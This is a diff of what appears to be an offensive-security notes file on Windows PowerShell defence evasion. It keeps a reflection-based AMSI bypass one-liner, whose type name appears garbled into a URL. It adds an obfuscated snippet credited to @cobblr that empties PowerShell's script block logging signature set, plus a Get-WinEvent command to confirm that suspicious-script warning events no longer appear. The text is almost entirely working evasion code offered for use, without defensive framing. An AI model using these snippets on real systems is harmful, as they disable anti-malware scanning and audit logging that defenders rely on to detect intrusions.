@@ -4,7 +4,15 @@
 
 ````[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)````
 
-and old school AMSI bypass recorded here for posterity. 
+and old school AMSI bypass by reflection recorded here for posterity. 
+
+#### improved on by @cobblr
+````
+[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+
+# check
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Where {$_.LevelDisplayName -eq 'Warning'} | Measure
+````
 
 ### @joevennix writes:
 
